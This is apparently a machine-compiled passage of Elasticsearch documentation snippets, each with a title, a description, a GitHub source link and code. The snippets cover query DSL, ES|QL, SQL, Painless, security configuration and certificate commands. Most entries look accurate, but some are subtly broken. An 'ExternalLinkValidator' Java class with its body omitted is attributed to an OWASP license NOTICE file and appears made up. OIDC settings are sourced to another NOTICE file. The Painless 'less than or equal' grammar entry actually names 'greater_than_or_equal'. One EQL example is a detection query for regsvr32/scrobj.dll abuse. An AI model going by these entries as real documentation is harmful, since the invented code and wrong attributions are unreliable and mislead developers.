\"quick brown fox\" but not \"the fox is quick and brown\".\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-match-query-phrase-prefix.md#2025-04-21_snippet_0\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"match_phrase_prefix\": {\n      \"message\": {\n        \"query\": \"quick brown f\"\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch COUNT_DISTINCT Approximate Counting Documentation\nDESCRIPTION: Documentation block explaining the approximate counting mechanism using HyperLogLog++ algorithm in Elasticsearch's COUNT_DISTINCT function. Describes how exact counting is impractical for high-cardinality sets and explains the precision_threshold parameter that allows trading memory for accuracy, with a default value of 3000 and maximum of 40000.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/appendix/count_distinct.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.\n\n### Counts are approximate [esql-agg-count-distinct-approximate]\n\nComputing exact counts requires loading values into a set and returning its\nsize. This doesn't scale when working on high-cardinality sets and/or large\nvalues as the required memory usage and the need to communicate those\nper-shard sets between nodes would utilize too many resources of the cluster.\n\nThis `COUNT_DISTINCT` function is based on the\n[HyperLogLog++](https://static.googleusercontent.com/media/research.google.com/fr//pubs/archive/40671.pdf)\nalgorithm, which counts based on the hashes of the values with some interesting\nproperties:\n\n:::{include} /reference/aggregations/_snippets/search-aggregations-metrics-cardinality-aggregation-explanation.md\n:::\n\nThe `COUNT_DISTINCT` function takes an optional second parameter to configure\nthe precision threshold. The `precision_threshold` options allows to trade memory\nfor accuracy, and defines a unique count below which counts are expected to be\nclose to accurate. Above this value, counts might become a bit more fuzzy. The\nmaximum supported value is `40000`, thresholds above this number will have the\nsame effect as a threshold of `40000`. The default value is `3000`.\n```\n\n----------------------------------------\n\nTITLE: Documenting ESQL Greater Than Operator in Markdown\nDESCRIPTION: Explains the behavior of the greater than (>) operator in ESQL, including its handling of multivalued fields and conditions for search index optimization.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/kibana/docs/operators/greater_than.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n### GREATER THAN `>`\nCheck if one field is greater than another. If either field is [multivalued](https://www.elastic.co/docs/reference/query-languages/esql/esql-multivalued-fields) then the result is `null`.\n\nNote: This is pushed to the underlying search index if one side of the comparison is constant and the other side is a field in the index that has both an [mapping-index](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/mapping-index) and [doc-values](https://www.elastic.co/docs/reference/elasticsearch/mapping-reference/doc-values).\n```\n\n----------------------------------------\n\nTITLE: CORS Configuration in Elasticsearch\nDESCRIPTION: Example of configuring Cross-Origin Resource Sharing (CORS) settings including origin patterns and allowed methods.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/configuration-reference/networking-settings.md#2025-04-21_snippet_7\n\nLANGUAGE: yaml\nCODE:\n```\nhttp.cors.enabled: true\nhttp.cors.allow-origin: \"/https?:\\/\\/localhost(:[0-9]+)?/\"\nhttp.cors.allow-methods: \"OPTIONS, HEAD, GET, POST, PUT, DELETE\"\nhttp.cors.allow-headers: \"X-Requested-With, Content-Type, Content-Length, Authorization\"\n```\n\n----------------------------------------\n\nTITLE: Using MV_APPEND to Combine Multiple Date Fields in ESQL\nDESCRIPTION: Demonstrates how to use the MV_APPEND function in ESQL to combine birth_date and hire_date fields into a new array field called 'dates'. The query filters for specific employee numbers, sorts them, and returns selected fields including the newly created array field.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/mv_append.md#2025-04-21_snippet_0\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| WHERE emp_no == 10039 OR emp_no == 10040\n| SORT emp_no\n| EVAL dates = MV_APPEND(birth_date, hire_date)\n| KEEP emp_no, birth_date, hire_date, dates\n```\n\n----------------------------------------\n\nTITLE: Converting String to Integer with CAST\nDESCRIPTION: Example of using CAST to convert a string value to an integer data type in Elasticsearch SQL.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-type-conversion.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CAST('123' AS INT) AS int;\n\n      int\n---------------\n123\n```\n\n----------------------------------------\n\nTITLE: Conditional Operator Examples in Painless\nDESCRIPTION: Illustrates the use of the ternary conditional operator with various data types and conditions. Shows type promotion and boolean evaluation.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-general.md#2025-04-21_snippet_2\n\nLANGUAGE: painless\nCODE:\n```\nboolean b = true;\nint x = b ? 1 : 2;\nList y = x > 1 ? new ArrayList() : null;\ndef z = x < 2 ? x : 2.0;\n```\n\n----------------------------------------\n\nTITLE: EQL Sequence Search with Shared Field Values in Elasticsearch\nDESCRIPTION: Illustrates an EQL sequence search where events share the same process.pid value, using the 'by' keyword for each event.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/eql.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /my-data-stream/_eql/search\n{\n  \"query\": \"\"\"\n    sequence with maxspan=1h\n      [ process where process.name == \"regsvr32.exe\" ] by process.pid\n      [ file where stringContains(file.name, \"scrobj.dll\") ] by process.pid\n  \"\"\"\n}\n```\n\n----------------------------------------\n\nTITLE: Weight Function Implementation\nDESCRIPTION: This snippet illustrates how to implement the `weight` function of the `function_score` query using the `script_score` query.  It shows how to multiply the original score by a weight parameter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-script-score-query.md#2025-04-21_snippet_8\n\nLANGUAGE: js\nCODE:\n```\n\"script\" : {\n    \"source\" : \"params.weight * _score\",\n    \"params\": {\n        \"weight\": 2\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Configuring HTTP OIDC Authentication in Elasticsearch\nDESCRIPTION: YAML configuration for OpenID Connect authentication in Elasticsearch. This setup enables OIDC-based authentication and specifies the OIDC realm to use for identity verification.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/failureaccess-NOTICE.txt#2025-04-21_snippet_8\n\nLANGUAGE: yaml\nCODE:\n```\nxpack.security.http.authentication.type: oidc\nxpack.security.http.authentication.realm: oidc1\n```\n\n----------------------------------------\n\nTITLE: Computing Average with Nested Functions in ESQL\nDESCRIPTION: This example demonstrates how to calculate an average over a multivalued column by first using MV_AVG to average the multiple values per row, then using AVG and ROUND to get the final result.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/examples/avg.md#2025-04-21_snippet_1\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\n| STATS avg_salary_change = ROUND(AVG(MV_AVG(salary_change)), 10)\n```\n\n----------------------------------------\n\nTITLE: Sample Response for Moving Percentiles Aggregation\nDESCRIPTION: Illustrates the structure of a response from a moving_percentiles aggregation, showing calculated percentiles for multiple time buckets.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-pipeline-moving-percentiles-aggregation.md#2025-04-21_snippet_2\n\nLANGUAGE: console-result\nCODE:\n```\n{\n   \"took\": 11,\n   \"timed_out\": false,\n   \"_shards\": ...,\n   \"hits\": ...,\n   \"aggregations\": {\n      \"my_date_histo\": {\n         \"buckets\": [\n             {\n                 \"key_as_string\": \"2015/01/01 00:00:00\",\n                 \"key\": 1420070400000,\n                 \"doc_count\": 3,\n                 \"the_percentile\": {\n                     \"values\": {\n                       \"1.0\": 151.0,\n                       \"99.0\": 200.0\n                     }\n                 }\n             },\n             {\n                 \"key_as_string\": \"2015/02/01 00:00:00\",\n                 \"key\": 1422748800000,\n                 \"doc_count\": 2,\n                 \"the_percentile\": {\n                     \"values\": {\n                       \"1.0\": 10.4,\n                       \"99.0\": 49.6\n                     }\n                 },\n                 \"the_movperc\": {\n                   \"values\": {\n                     \"1.0\": 151.0,\n                     \"99.0\": 200.0\n                   }\n                 }\n             },\n             {\n                 \"key_as_string\": \"2015/03/01 00:00:00\",\n                 \"key\": 1425168000000,\n                 \"doc_count\": 2,\n                 \"the_percentile\": {\n                    \"values\": {\n                      \"1.0\": 175.25,\n                      \"99.0\": 199.75\n                    }\n                 },\n                 \"the_movperc\": {\n                    \"values\": {\n                      \"1.0\": 11.6,\n                      \"99.0\": 200.0\n                    }\n                 }\n             }\n         ]\n      }\n   }\n}\n```\n\n----------------------------------------\n\nTITLE: Processed Document Result\nDESCRIPTION: Example response showing the processed document with extracted attachment information for each file in the array.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/enrich-processor/attachment.md#2025-04-21_snippet_14\n\nLANGUAGE: console-result\nCODE:\n```\n{\n  \"_index\" : \"my-index-000001\",\n  \"_id\" : \"my_id\",\n  \"_version\" : 1,\n  \"_seq_no\" : 50,\n  \"_primary_term\" : 1,\n  \"found\" : true,\n  \"_source\" : {\n    \"attachments\" : [\n      {\n        \"filename\" : \"ipsum.txt\",\n        \"attachment\" : {\n          \"content_type\" : \"text/plain; charset=ISO-8859-1\",\n          \"language\" : \"en\",\n          \"content\" : \"this is\\njust some text\",\n          \"content_length\" : 24\n        }\n      },\n      {\n        \"filename\" : \"test.txt\",\n        \"attachment\" : {\n          \"content_type\" : \"text/plain; charset=ISO-8859-1\",\n          \"language\" : \"en\",\n          \"content\" : \"This is a test\",\n          \"content_length\" : 16\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using CURRENT_DATE Keyword in Elasticsearch SQL\nDESCRIPTION: Example showing how to use CURRENT_DATE as a keyword to get the current date.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_8\n\nLANGUAGE: sql\nCODE:\n```\nSELECT CURRENT_DATE AS result;\n\n         result\n------------------------\n2018-12-12\n```\n\n----------------------------------------\n\nTITLE: Create the Elasticsearch keystore with password prompt\nDESCRIPTION: Creates a new, password-protected Elasticsearch keystore. The command prompts for a password and generates the keystore file alongside elasticsearch.yml.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/command-line-tools/elasticsearch-keystore.md#_snippet_0\n\nLANGUAGE: Shell\nCODE:\n```\nbin/elasticsearch-keystore create -p\n```\n\n----------------------------------------\n\nTITLE: Wildcard Field Pattern Searching\nDESCRIPTION: Shows how to use wildcard notation to search within all fields of a specific object. This allows searching across all fields that match the pattern, including nested fields.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-query-string-query.md#2025-04-21_snippet_15\n\nLANGUAGE: console\nCODE:\n```\nGET /_search\n{\n  \"query\": {\n    \"query_string\" : {\n      \"fields\" : [\"city.*\"],\n      \"query\" : \"this AND that OR thus\"\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Defining ArrayStoreException in Java\nDESCRIPTION: This snippet defines the java.lang.ArrayStoreException class, thrown to indicate that an attempt has been made to store the wrong type of object into an array of objects. It includes a default constructor and a constructor that accepts a string message.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.lang.txt#2025-04-21_snippet_28\n\nLANGUAGE: java\nCODE:\n```\nclass java.lang.ArrayStoreException {\n  ()\n  (String)\n}\n```\n\n----------------------------------------\n\nTITLE: Creating Elasticsearch instances.yml configuration\nDESCRIPTION: This script generates an `instances.yml` file, which configures multiple Elasticsearch node instances. It uses nested loops to create entries for each node and cluster combination, defining their names, common names (CN), and DNS entries.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/core/src/test/resources/org/elasticsearch/xpack/security/transport/ssl/certs/simple/nodes/readme.md#2025-04-21_snippet_1\n\nLANGUAGE: bash\nCODE:\n```\nrm instances.yml\necho 'instances:'                                   >> instances.yml\nfor n in {1..8}\ndo\nfor c in {1..8}\ndo\necho \"  - name: \\\"n$n.c$c\\\"\"                        >> instances.yml\necho \"    cn:\"                                      >> instances.yml\necho \"      - \\\"node$n.cluster$c.elasticsearch\\\"\"   >> instances.yml\necho \"    dns: \"                                    >> instances.yml\necho \"      - \\\"node$n.cluster$c.elasticsearch\\\"\"   >> instances.yml\ndone\ndone\ncat instances.yml\n```\n\n----------------------------------------\n\nTITLE: Zooming into a Specific Geohash in Elasticsearch\nDESCRIPTION: This example shows how to zoom into a specific geohash (u17) by using it as both top_left and bottom_right corners in a geo_bounding_box filter.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-bucket-geohashgrid-aggregation.md#2025-04-21_snippet_3\n\nLANGUAGE: console\nCODE:\n```\nPOST /museums/_search?size=0\n{\n  \"aggregations\": {\n    \"zoomed-in\": {\n      \"filter\": {\n        \"geo_bounding_box\": {\n          \"location\": {\n            \"top_left\": \"u17\",\n            \"bottom_right\": \"u17\"\n          }\n        }\n      },\n      \"aggregations\": {\n        \"zoom1\": {\n          \"geohash_grid\": {\n            \"field\": \"location\",\n            \"precision\": 8\n          }\n        }\n      }\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Extracting documents with geohex geo_grid query\nDESCRIPTION: This snippet executes a geo_grid query using geohex values to fetch documents matching a specific geohex bucket in Elasticsearch. The GET query requires the geohex value to filter and returns documents for that particular grid.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-geo-grid-query.md#2025-04-21_snippet_6\n\nLANGUAGE: Elasticsearch\nCODE:\n```\nGET /my_locations/_search\n{\n  \"query\": {\n    \"geo_grid\" :{\n      \"location\" : {\n        \"geohex\" : \"811fbffffffffff\"\n      }\n    }\n  }\n}\n```\n\nLANGUAGE: Elasticsearch\nCODE:\n```\n{\n  \"took\" : 26,\n  \"timed_out\" : false,\n  \"_shards\" : {\n    \"total\" : 1,\n    \"successful\" : 1,\n    \"skipped\" : 0,\n    \"failed\" : 0\n  },\n  \"hits\" : {\n    \"total\" : {\n      \"value\" : 1,\n      \"relation\" : \"eq\"\n    },\n    \"max_score\" : 1.0,\n    \"hits\" : [\n      {\n        \"_index\" : \"my_locations\",\n        \"_id\" : \"3\",\n        \"_score\" : 1.0,\n        \"_source\" : {\n          \"location\" : \"POINT(2.336389 48.861111)\",\n          \"city\" : \"Paris\",\n          \"name\" : \"Musée du Louvre\"\n        }\n      }\n    ]\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Executing Percolator Search with Highlighting\nDESCRIPTION: Search request using percolate query with highlighting enabled to match stored queries against a document.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/query-dsl/query-dsl-percolate-query.md#2025-04-21_snippet_8\n\nLANGUAGE: console\nCODE:\n```\nGET /my-index-000001/_search\n{\n  \"query\": {\n    \"percolate\": {\n      \"field\": \"query\",\n      \"document\": {\n        \"message\": \"The quick brown fox jumps over the lazy dog\"\n      }\n    }\n  },\n  \"highlight\": {\n    \"fields\": {\n      \"message\": {}\n    }\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Using EXTRACT Function in Elasticsearch SQL\nDESCRIPTION: Extracts specific datetime fields using a datetime function name. Provides alternative syntax to direct datetime functions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-functions-datetime.md#2025-04-21_snippet_69\n\nLANGUAGE: sql\nCODE:\n```\nSELECT EXTRACT(DAY_OF_YEAR FROM CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\n```\n\nLANGUAGE: sql\nCODE:\n```\nSELECT DAY_OF_YEAR(CAST('2018-02-19T10:23:27Z' AS TIMESTAMP)) AS day;\n```\n\n----------------------------------------\n\nTITLE: Elasticsearch Connector Configuration\nDESCRIPTION: YAML configuration example for setting up the Google Cloud Storage connector with Elasticsearch. Includes host configuration, API keys, and connector settings.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-google-cloud.md#2025-04-21_snippet_1\n\nLANGUAGE: yaml\nCODE:\n```\n# When connecting to your cloud deployment you should edit the host value\nelasticsearch.host: http://host.docker.internal:9200\nelasticsearch.api_key: <ELASTICSEARCH_API_KEY>\n\nconnectors:\n  -\n    connector_id: <CONNECTOR_ID_FROM_KIBANA>\n    service_type: google_cloud_storage\n    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead\n```\n\n----------------------------------------\n\nTITLE: Defining Less Than Or Equal Operator Grammar in Painless\nDESCRIPTION: Specifies the grammar for the less than or equal operator in Painless scripting language.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-boolean.md#2025-04-21_snippet_4\n\nLANGUAGE: text\nCODE:\n```\ngreater_than_or_equal: expression '<=' expression;\n```\n\n----------------------------------------\n\nTITLE: Using Nested Functions in ESQL STATS Aggregations\nDESCRIPTION: Demonstrates using nested functions like MV_AVG within STATS for complex calculations on multivalued columns.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/commands/layout/stats-by.md#2025-04-21_snippet_9\n\nLANGUAGE: esql\nCODE:\n```\nFROM employees\nSTATS\n  avg_salary_change = AVG(MV_AVG(salary_history))\nBY department;\n```\n\n----------------------------------------\n\nTITLE: Demonstrating List Access with Def Type in Painless\nDESCRIPTION: Illustrates the use of the list access operator with the def type in Painless, showing implicit type casting and method calls on ArrayList instances.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/scripting-languages/painless/painless-operators-reference.md#2025-04-21_snippet_10\n\nLANGUAGE: painless\nCODE:\n```\ndef d = new ArrayList(); \nd.add(1);                \nd.add(2);                \nd.add(3);                \nd[0] = 2;                \nd[1] = 5;                \ndef x = d[0] + d[1];     \ndef y = 1;               \ndef z = d[y];            \n```\n\n----------------------------------------\n\nTITLE: SQL SHOW COLUMNS Example Output\nDESCRIPTION: Example output of SHOW COLUMNS command showing column names, data types, and their corresponding Elasticsearch mappings for an 'emp' table structure.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-columns.md#2025-04-21_snippet_1\n\nLANGUAGE: sql\nCODE:\n```\nSHOW COLUMNS IN emp;\n\n       column       |     type      |    mapping\n--------------------+---------------+---------------\nbirth_date          |TIMESTAMP      |datetime\ndep                 |STRUCT         |nested\ndep.dep_id          |VARCHAR        |keyword\ndep.dep_name        |VARCHAR        |text\ndep.dep_name.keyword|VARCHAR        |keyword\ndep.from_date       |TIMESTAMP      |datetime\ndep.to_date         |TIMESTAMP      |datetime\nemp_no              |INTEGER        |integer\nfirst_name          |VARCHAR        |text\nfirst_name.keyword  |VARCHAR        |keyword\ngender              |VARCHAR        |keyword\nhire_date           |TIMESTAMP      |datetime\nlanguages           |TINYINT        |byte\nlast_name           |VARCHAR        |text\nlast_name.keyword   |VARCHAR        |keyword\nname                |VARCHAR        |keyword\nsalary              |INTEGER        |integer\n```\n\n----------------------------------------\n\nTITLE: SQL SHOW TABLES Syntax Definition\nDESCRIPTION: Defines the complete syntax for the SHOW TABLES command including optional catalog filtering, frozen indices inclusion, and pattern matching capabilities.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/sql/sql-syntax-show-tables.md#2025-04-21_snippet_0\n\nLANGUAGE: sql\nCODE:\n```\nSHOW TABLES\n    [CATALOG [catalog_identifier | \n              LIKE pattern]]?\n    [INCLUDE FROZEN]?\n    [table_identifier |\n     LIKE pattern]?\n```\n\n----------------------------------------\n\nTITLE: Defining ScoreScript and ScoreScript Factory Class in Java\nDESCRIPTION: This snippet defines the ScoreScript and ScoreScript Factory classes, which serve as the foundation for creating custom scoring scripts in Elasticsearch. The classes are crucial for extending score manipulation during query executions.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/org.elasticsearch.script.score.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\nclass org.elasticsearch.script.ScoreScript @no_import {\n}\nclass org.elasticsearch.script.ScoreScript$Factory @no_import {\n}\n```\n\n----------------------------------------\n\nTITLE: Implementing ExternalLinkValidator Class in Java for Elasticsearch\nDESCRIPTION: This code snippet defines the ExternalLinkValidator class, which implements the LinkValidator interface. It includes constructor initialization, dependency injection, and methods for validating external links.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/x-pack/plugin/watcher/licenses/owasp-java-html-sanitizer-NOTICE.txt#2025-04-21_snippet_0\n\nLANGUAGE: Java\nCODE:\n```\npublic class ExternalLinkValidator implements LinkValidator {\n    private final Client client;\n    private final int maxConnectionsPerRoute;\n    private final int maxTotalConnections;\n    private final int timeout;\n    private final List<String> excludePatterns;\n\n    public ExternalLinkValidator(\n            Client client,\n            int maxConnectionsPerRoute,\n            int maxTotalConnections,\n            int timeout,\n            List<String> excludePatterns\n    ) {\n        this.client = client;\n        this.maxConnectionsPerRoute = maxConnectionsPerRoute;\n        this.maxTotalConnections = maxTotalConnections;\n        this.timeout = timeout;\n        this.excludePatterns = excludePatterns;\n    }\n\n    @Override\n    public LinkValidationResult validate(String link) {\n        // Implementation details omitted for brevity\n        return null;\n    }\n\n    // Other methods and implementation details...\n}\n```\n\n----------------------------------------\n\nTITLE: BigDecimal Class Definition in Painless\nDESCRIPTION: Defines the available methods and constants for BigDecimal class operations including arithmetic, comparison, and formatting operations.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/modules/lang-painless/src/main/resources/org/elasticsearch/painless/java.math.txt#2025-04-21_snippet_0\n\nLANGUAGE: java\nCODE:\n```\nclass java.math.BigDecimal {\n  BigDecimal ONE\n  BigDecimal TEN\n  BigDecimal ZERO\n  (String)\n  (String,MathContext)\n  BigDecimal abs()\n  BigDecimal abs(MathContext)\n  BigDecimal add(BigDecimal)\n  BigDecimal add(BigDecimal,MathContext)\n  byte byteValueExact()\n  int compareTo(BigDecimal)\n  BigDecimal divide(BigDecimal)\n  BigDecimal divide(BigDecimal,MathContext)\n  BigDecimal[] divideAndRemainder(BigDecimal)\n  BigDecimal[] divideAndRemainder(BigDecimal,MathContext)\n  BigDecimal divideToIntegralValue(BigDecimal)\n  BigDecimal divideToIntegralValue(BigDecimal,MathContext)\n  int intValueExact()\n  long longValueExact()\n  BigDecimal max(BigDecimal)\n  BigDecimal min(BigDecimal)\n  BigDecimal movePointLeft(int)\n  BigDecimal movePointRight(int)\n  BigDecimal multiply(BigDecimal)\n  BigDecimal multiply(BigDecimal,MathContext)\n  BigDecimal negate()\n  BigDecimal negate(MathContext)\n  BigDecimal plus()\n  BigDecimal plus(MathContext)\n  BigDecimal pow(int)\n  BigDecimal pow(int,MathContext)\n  int precision()\n  BigDecimal remainder(BigDecimal)\n  BigDecimal remainder(BigDecimal,MathContext)\n  BigDecimal round(MathContext)\n  int scale()\n  BigDecimal scaleByPowerOfTen(int)\n  BigDecimal setScale(int)\n  BigDecimal setScale(int,RoundingMode)\n  short shortValueExact()\n  int signum()\n  BigDecimal stripTrailingZeros()\n  BigDecimal subtract(BigDecimal)\n  BigDecimal subtract(BigDecimal,MathContext)\n  BigInteger toBigInteger()\n  BigInteger toBigIntegerExact()\n  String toEngineeringString()\n  String toPlainString()\n  BigDecimal ulp()\n  BigDecimal valueOf(double)\n}\n```\n\n----------------------------------------\n\nTITLE: ESQL AS_GEO_SHAPE Function Description\nDESCRIPTION: Describes the AS_GEO_SHAPE function, which converts input values to geo_shape values. It specifically mentions that string inputs must conform to the Well-known text (WKT) format to be successfully converted.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/description/to_geoshape.md#2025-04-21_snippet_0\n\nLANGUAGE: markdown\nCODE:\n```\n**Description**\n\nConverts an input value to a `geo_shape` value. A string will only be successfully converted if it respects the [WKT](https://en.wikipedia.org/wiki/Well-known_text_representation_of_geometry) format.\n```\n\n----------------------------------------\n\nTITLE: Basic T-test Aggregation Syntax in Elasticsearch\nDESCRIPTION: Demonstrates the basic syntax for a t_test aggregation in Elasticsearch, showing how to specify the fields for comparison and the test type.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/aggregations/search-aggregations-metrics-ttest-aggregation.md#2025-04-21_snippet_0\n\nLANGUAGE: js\nCODE:\n```\n{\n  \"t_test\": {\n    \"a\": \"value_before\",\n    \"b\": \"value_after\",\n    \"type\": \"paired\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Generating SSH Keys and Certificate for Azure with OpenSSL\nDESCRIPTION: Commands to generate the SSH keys and certificate required for Azure authentication. This creates a private key, certificate file, and certificate in DER format.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch-plugins/discovery-azure-classic-long.md#2025-04-21_snippet_0\n\nLANGUAGE: sh\nCODE:\n```\n# You may want to use another dir than /tmp\ncd /tmp\nopenssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout azure-private.key -out azure-certificate.pem\nchmod 600 azure-private.key azure-certificate.pem\nopenssl x509 -outform der -in azure-certificate.pem -out azure-certificate.cer\n```\n\n----------------------------------------\n\nTITLE: Markdown Documentation Structure for TO_DATETIME Function\nDESCRIPTION: Markdown structure that organizes the documentation for the TO_DATETIME function, including sections for syntax, parameters, description, types, and examples with image inclusion.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/query-languages/esql/_snippets/functions/layout/to_datetime.md#2025-04-21_snippet_1\n\nLANGUAGE: markdown\nCODE:\n```\n## `TO_DATETIME` [esql-to_datetime]\n\n**Syntax**\n\n:::{image} ../../../images/functions/to_datetime.svg\n:alt: Embedded\n:class: text-center\n:::\n\n\n:::{include} ../parameters/to_datetime.md\n:::\n\n:::{include} ../description/to_datetime.md\n:::\n\n:::{include} ../types/to_datetime.md\n:::\n\n:::{include} ../examples/to_datetime.md\n:::\n```\n\n----------------------------------------\n\nTITLE: Indexing Database Rows based on Checkbox - JSON Snippet - JavaScript\nDESCRIPTION: This JSON snippet filters and indexes rows of a specific database where the 'Task completed' property is a checkbox that evaluates to true. This is key for dynamic content synchronization based on task status.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-notion.md#2025-04-21_snippet_9\n\nLANGUAGE: javascript\nCODE:\n```\n{\n  \"database_query_filters\": [\n    {\n      \"filter\": {\n          \"property\": \"Task completed\",\n          \"checkbox\": {\n            \"equals\": true\n          }\n      },\n      \"database_id\": \"database_id\"\n    }\n  ]\n}\n```\n\n----------------------------------------\n\nTITLE: Converting Unsigned Long to Float in Elasticsearch Scripts\nDESCRIPTION: This snippet shows how to convert an unsigned long field to a float value in an Elasticsearch script for scoring.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/mapping-reference/unsigned-long.md#2025-04-22_snippet_7\n\nLANGUAGE: console\nCODE:\n```\nGET /my_index/_search\n{\n    \"query\": {\n        \"script_score\": {\n          \"query\": {\"match_all\": {}},\n          \"script\": {\n            \"source\": \"field('my_counter').asBigInteger(BigInteger.ZERO).floatValue()\"\n          }\n        }\n    }\n}\n```\n\n----------------------------------------\n\nTITLE: Setting Per-Index Store Type in Elasticsearch\nDESCRIPTION: Demonstrates how to set the store type for a specific index during index creation using the Elasticsearch API. This example sets the store type to 'hybridfs'.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/elasticsearch/index-settings/store.md#2025-04-21_snippet_1\n\nLANGUAGE: console\nCODE:\n```\nPUT /my-index-000001\n{\n  \"settings\": {\n    \"index.store.type\": \"hybridfs\"\n  }\n}\n```\n\n----------------------------------------\n\nTITLE: Regex Explanation of CamelCase Tokenizer\nDESCRIPTION: This regex explanation clarifies how the CamelCase tokenizer works.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/text-analysis/analysis-pattern-analyzer.md#2025-04-21_snippet_6\n\nLANGUAGE: text\nCODE:\n```\n  ([^\\p{L}\\d]+)                 # swallow non letters and numbers,\n| (?<=\\D)(?=\\d)                 # or non-number followed by number,\n| (?<=\\d)(?=\\D)                 # or number followed by non-number,\n| (?<=[ \\p{L} && [^\\p{Lu}]])    # or lower case\n  (?=\\p{Lu})                    #   followed by upper case,\n| (?<=\\p{Lu})                   # or upper case\n  (?=\\p{Lu}                     #   followed by upper case\n    [\\p{L}&&[^\\p{Lu}]]          #   then lower case\n  )\n```\n\n----------------------------------------\n\nTITLE: Convert Node Keystore to PKCS#12\nDESCRIPTION: Converts the node's JKS keystore to PKCS#12 format for private key extraction\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/build-tools-internal/src/main/resources/test/ssl/README.md#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\nkeytool -importkeystore -srckeystore test-node.jks -srcstorepass keypass -destkeystore test-node.p12 -deststoretype PKCS12 -deststorepass keypass\n```\n\n----------------------------------------\n\nTITLE: Creating Docker Network\nDESCRIPTION: This command creates a Docker network named `elastic`. This allows the extraction service, self-managed connector, and Elasticsearch to communicate within the same network.\nSOURCE: https://github.com/elastic/elasticsearch/blob/main/docs/reference/search-connectors/es-connectors-content-extraction.md#2025-04-21_snippet_6\n\nLANGUAGE: bash\nCODE:\n```\n$ docker network create elastic\n```\n\n----------------------------------------\n\nTITLE: EMPTY Operator Examples\nDESCRIPTION: Examples showing the hash operator which matches no string, useful in programmatically constructed patterns when the EMPTY flag is 